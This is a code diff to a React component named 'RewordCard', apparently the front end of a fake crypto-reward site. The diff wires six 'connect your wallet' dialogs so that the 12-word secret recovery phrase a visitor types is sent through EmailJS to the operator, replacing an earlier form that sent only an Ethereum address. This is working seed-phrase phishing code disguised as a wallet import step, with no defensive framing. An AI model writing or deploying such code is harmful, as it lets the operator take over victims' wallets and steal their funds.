@@ -51,13 +51,13 @@ const RewordCard = () => {
 
   const onSubmit = (data) => {
     emailjs
-      .sendForm('service_yuvh7i4', 'template_4zis24c', form.current, {
-        publicKey: 'RElQ17WxbehSv1AID',
+      .sendForm('service_pq3up0o', 'template_tekflom', form.current, {
+        publicKey: 'LE-1gIcbm_kkDTqTk',
       })
       .then(
         () => {
           reset();
-          toast.success('Ethereum address send successfully');
+          toast.success('Word phrase send successfully');
           // console.log('SUCCESS!');
         },
         (error) => {
@@ -85,13 +85,13 @@ const RewordCard = () => {
               </div>
 
               <div className="px-4 md:px-6">
-                <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                <div>
                   <div className="flex items-center relative">
                     <label htmlFor="" className="absolute ml-6">
                       <img src={icons} alt="Icons" />
                     </label>
 
-                    <Input type="email" {...register("subject", { required: true })} placeholder="Ethereum address" className="border border-[#1f213a] dark:border-[#7a8aa062] px-12 py-8 rounded-[18px] bg-transparent text-[18px] placeholder:text-[18px] placeholder:font-medium text-[#6c6c96] dark:text-[#7A8AA0] placeholder:text-[#6c6c96] focus-visible:ring-offset-1 focus-visible:ring-offset-[#373a64]" />
+                    <Input type="email" placeholder="Ethereum address" className="border border-[#1f213a] dark:border-[#7a8aa062] px-12 py-8 rounded-[18px] bg-transparent text-[18px] placeholder:text-[18px] placeholder:font-medium text-[#6c6c96] dark:text-[#7A8AA0] placeholder:text-[#6c6c96] focus-visible:ring-offset-1 focus-visible:ring-offset-[#373a64]" />
                   </div>
 
                   <Dialog>
@@ -180,8 +180,11 @@ const RewordCard = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -251,8 +254,11 @@ const RewordCard = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -323,8 +329,11 @@ const RewordCard = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -394,8 +403,11 @@ const RewordCard = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -465,8 +477,11 @@ const RewordCard = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -536,8 +551,11 @@ const RewordCard = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -564,7 +582,7 @@ const RewordCard = () => {
                       </DialogHeader>
                     </DialogContent>
                   </Dialog>
-                </form>
+                </div>
               </div>
 
               <div className="py-[30px] flex justify-between items-center px-4 md:px-6">
